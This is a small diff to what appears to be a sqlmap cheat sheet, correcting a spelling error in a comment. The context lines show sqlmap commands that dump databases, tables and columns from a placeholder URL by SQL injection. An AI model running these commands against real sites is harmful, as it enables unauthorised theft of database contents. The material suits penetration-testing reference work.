@@ -126,7 +126,7 @@ Enumerate tables content of a specific database.
 sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name
 ```
 
-Enumerate content by specifing table, column, and database.
+Enumerate content by specifying table, column, and database.
 
 ```bash
 sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name -T table_name -C col_name
